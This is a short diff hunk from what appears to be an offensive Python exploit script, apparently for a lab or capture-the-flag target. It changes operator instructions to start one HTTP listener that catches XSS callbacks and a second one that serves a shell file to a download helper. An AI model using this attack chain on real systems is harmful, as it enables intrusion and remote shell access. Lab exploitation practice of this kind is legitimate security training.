@@ -74,7 +74,7 @@ def main():
     warnings.filterwarnings("ignore", category=InsecureRequestWarning)
     
     # remind user to start a listener
-    print("Make sure to start a listener before this. Run the following command:\nsudo python3 -m http.server 80\nThis will catch responses from your XSS and allow the DownloadHelper to grab your payload")
+    print("Make sure to start a listener before this. Run the following commands:\nsudo python3 -m http.server 80 (to catch responses from your XSS)\npython3 -m http.server 8001 (to serve your shell file to the DownloadHelper)\n")
     input("Press enter to continue once you've started your listener...\n")
 
     # get tun0 IP address
